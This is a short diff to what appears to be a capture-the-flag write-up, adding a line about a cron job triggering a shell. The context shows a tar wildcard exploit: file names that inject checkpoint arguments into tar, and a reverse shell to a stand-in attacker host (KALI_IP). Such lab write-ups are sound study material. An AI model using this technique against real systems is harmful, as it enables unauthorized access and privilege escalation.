@@ -248,6 +248,8 @@ We can do a tar wildcard exploit.
 cd /var/www/internal/invoices; echo "/bin/bash -c 'bash -i >& /dev/tcp/KALI_IP/9999 0>&1'" > shell.sh; echo "" > "--checkpoint-action=exec=sh shell.sh"; echo "" > --checkpoint=1; chmod 777 shell.sh
 ```
 
+When the cron job runs again in a minute, we get a shell on our end.
+
 ## Root Privesc
 
 Lets replace his key with our own key pair generated from `ssh-keygen`.
